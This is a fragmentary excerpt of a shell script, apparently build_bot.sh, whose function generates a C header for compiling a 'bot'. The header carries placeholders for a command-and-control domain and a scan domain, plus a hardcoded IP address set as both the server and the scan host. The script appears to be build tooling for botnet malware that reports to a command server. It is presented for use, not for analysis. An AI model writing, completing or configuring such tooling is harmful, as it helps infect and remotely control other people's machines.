...
create_build_config() {
    local config_file="$BOT_SOURCE_DIR/build_config.h"
    
    cat > "$config_file" << 'EOF'
#ifndef BUILD_CONFIG_H
#define BUILD_CONFIG_H

// Build configuration for bot compilation
// This file is auto-generated by build_bot.sh

// Domain configuration (uncomment if using USEDOMAIN flag)
// #define SERVDOM "your-cnc-domain.com"
// #define SCANDOM "your-scan-domain.com"

// IP configuration (current hardcoded values)
#define SERVIP_STR "136.175.200.15"
#define SCANIP_STR "136.175.200.15"
...
EOF
    ...
    echo -e "${GREEN}Created build configuration: $config_file${NC}"
}
